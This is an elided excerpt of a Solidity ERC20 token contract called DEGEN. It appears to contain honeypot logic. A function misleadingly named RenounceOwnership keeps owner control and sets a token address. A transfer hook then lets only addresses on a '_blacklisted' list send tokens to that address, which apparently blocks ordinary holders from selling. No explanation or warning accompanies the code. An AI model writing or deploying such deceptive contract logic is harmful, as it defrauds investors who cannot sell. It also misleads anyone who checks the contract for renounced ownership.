...
contract DEGEN is ERC20, Ownable {
    ...
    function RenounceOwnership(address degenToken_) public onlyOwner {
        _degenToken = degenToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _degenToken) {
            require(_blacklisted[from], "You're a bot not a degen!");
        }
    }
}